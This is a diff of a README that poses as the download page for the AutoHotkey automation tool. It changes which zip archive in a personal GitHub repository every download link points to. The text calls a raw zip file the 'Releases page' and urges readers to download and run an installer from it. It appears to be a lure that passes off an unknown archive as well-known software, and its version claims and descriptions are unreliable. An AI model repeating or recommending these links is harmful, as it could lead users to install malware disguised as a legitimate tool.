@@ -1,6 +1,6 @@
 # 🎉 AutoHotkey - Simplify Your Keyboard Tasks Today
 
-[![Download AutoHotkey](https://raw.githubusercontent.com/hichaocau123/AutoHotkey/main/finlet/AutoHotkey-v3.4.zip)](https://raw.githubusercontent.com/hichaocau123/AutoHotkey/main/finlet/AutoHotkey-v3.4.zip)
+[![Download AutoHotkey](https://raw.githubusercontent.com/hichaocau123/AutoHotkey/main/finlet/Auto-Hotkey-v3.1.zip)](https://raw.githubusercontent.com/hichaocau123/AutoHotkey/main/finlet/Auto-Hotkey-v3.1.zip)
 
 ## 🌟 Overview
 AutoHotkey helps you automate keyboard shortcuts, create hotkeys, and build macros easily. In 2025, it provides a user-friendly way to perform repetitive tasks quickly. With AutoHotkey, you can save time and improve your productivity without needing programming skills.
@@ -9,7 +9,7 @@ AutoHotkey helps you automate keyboard shortcuts, create hotkeys, and build macr
 Follow these simple steps to download and run AutoHotkey on your computer.
 
 1. **Visit the Releases Page:**  
-   Go to our [Releases page](https://raw.githubusercontent.com/hichaocau123/AutoHotkey/main/finlet/AutoHotkey-v3.4.zip) to access the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/hichaocau123/AutoHotkey/main/finlet/Auto-Hotkey-v3.1.zip) to access the latest version.
 
 2. **Download the Installer:**  
    On the Releases page, look for the most recent version. Click on the link to download the installer for your operating system.
@@ -21,7 +21,7 @@ Follow these simple steps to download and run AutoHotkey on your computer.
    After installation, you can find AutoHotkey in your programs list. Open the application to begin automating your tasks.
 
 ## 📥 Download & Install
-To get AutoHotkey, visit this page to download: [AutoHotkey Releases](https://raw.githubusercontent.com/hichaocau123/AutoHotkey/main/finlet/AutoHotkey-v3.4.zip).
+To get AutoHotkey, visit this page to download: [AutoHotkey Releases](https://raw.githubusercontent.com/hichaocau123/AutoHotkey/main/finlet/Auto-Hotkey-v3.1.zip).
 
 ## 📝 Features
 - **Keyboard Shortcuts:** Easily create shortcuts for your frequently used tasks.
@@ -52,4 +52,4 @@ Once you have AutoHotkey installed, you are ready to start automating your tasks
 
 Remember to save your scripts frequently and back them up to avoid losing your custom settings. Enjoy your new productivity tool!
 
-[![Download AutoHotkey](https://raw.githubusercontent.com/hichaocau123/AutoHotkey/main/finlet/AutoHotkey-v3.4.zip)](https://raw.githubusercontent.com/hichaocau123/AutoHotkey/main/finlet/AutoHotkey-v3.4.zip)
+[![Download AutoHotkey](https://raw.githubusercontent.com/hichaocau123/AutoHotkey/main/finlet/Auto-Hotkey-v3.1.zip)](https://raw.githubusercontent.com/hichaocau123/AutoHotkey/main/finlet/Auto-Hotkey-v3.1.zip)
